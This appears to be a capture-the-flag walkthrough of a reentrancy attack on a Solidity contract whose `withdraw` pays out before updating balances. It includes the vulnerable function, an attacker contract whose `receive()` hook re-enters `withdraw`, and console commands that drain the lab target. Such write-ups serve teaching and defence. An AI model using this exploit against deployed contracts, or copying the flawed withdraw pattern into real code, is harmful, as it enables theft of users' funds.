In `withdraw`, the balances are updated at the end of the function:

```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
    (bool result,) = msg.sender.call{value:_amount}("");
    if(result) {
        _amount;
    }
        balances[msg.sender] -= _amount;
    }
}
```

So the contract calls back the recipient before updating his balance:
on `msg.sender.call{value:_amount}("");`, he can run `withdraw` *again* with the same balance.

Actually, the function can run recursively forever if it is called while make sure that the first check is satisfied.

If the contract has 100 WEI and `balances[msg.sender]` holds 1 WEI, after 100 calls of `_amount` 1 the target is empty.

## Prepare

A standard address cannot callback when receiving ether.
This scenario requires to craft a malicious contract that can process payments.

Upon creation, the contract will deposit funds:

```solidity
constructor() payable {
    Cow(TARGET).donate{value:msg.value}(address(this));
}
```

This then allows to withdraw and implement the attack.

## Attack

When the contract receives money it asks for another round right away, in the same transaction:

```solidity
receive() external payable {
    if (TARGET.balance > 0) {
        Cow(TARGET).withdraw(msg.value);
    }
}
```

```js
// 1000000000000000
toWei(await getBalance(contract.address))
// 2000000000000000, after deployment
toWei(await getBalance(contract.address))
// start the recursion
web3.eth.sendTransaction({ from: player, to: '0x092d9a1E0BB316157c461fc8B8396D24e714Fa59', value: 1000000000000000 });
// 0, after attack
toWei(await getBalance(contract.address))
```
